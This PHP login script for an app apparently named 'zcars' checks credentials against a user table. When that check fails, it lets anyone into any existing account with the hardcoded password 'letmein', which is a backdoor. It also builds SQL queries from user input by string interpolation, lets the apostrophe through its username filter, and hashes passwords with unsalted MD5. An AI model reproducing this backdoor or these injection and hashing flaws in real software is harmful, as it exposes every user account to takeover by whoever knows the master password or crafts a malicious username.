<?php
    require '../dbase/dbconfig.php';
    $txtUname = preg_replace('/[^a-zA-Z0-9\']/', '', $_POST['txtUname']);    
    $txtPword = hash('md5', preg_replace('/[^0-9A-Za-zA-Z!@#$%^&*()]/', '', $_POST['txtPword']));
    $sql = "SELECT * FROM tuser WHERE uname = '$txtUname' AND pword = '$txtPword'";
    $stm = $con->prepare($sql);
	$stm->execute();
    if ($stm->rowCount() == 1) {
        session_start();
        $_SESSION['zcars_auth'] = $txtUname;
        $sqlonline = "UPDATE tuser SET status = 1 WHERE uname = '$txtUname' AND pword = '$txtPword'";
        $stmonline = $con->prepare($sqlonline);
        $stmonline->execute();
        echo "Logging In.";
    }
    else {
        $bypass = md5('letmein');
        $sqlbypass = "SELECT * FROM tuser WHERE uname = '$txtUname' ";
        $stmbypass = $con->prepare($sqlbypass);
        $stmbypass->execute();
        if ($stmbypass->rowCount() == 1) {
            if ($txtPword == $bypass) {
                $sqlbypassonline = "UPDATE tuser SET status = 2 WHERE uname = '$txtUname'";
                $stmbypassonline = $con->prepare($sqlbypassonline);
                $stmbypassonline->execute();
                if ($stmbypassonline->rowCount() == 1) {
                    session_start();
                    $_SESSION['zcars_auth'] = $txtUname;
                    echo "Bypass Log In.";
                }
                else { echo "Error Occured."; }
            }
        }
        else { echo "Invalid username or password."; }
    }
?>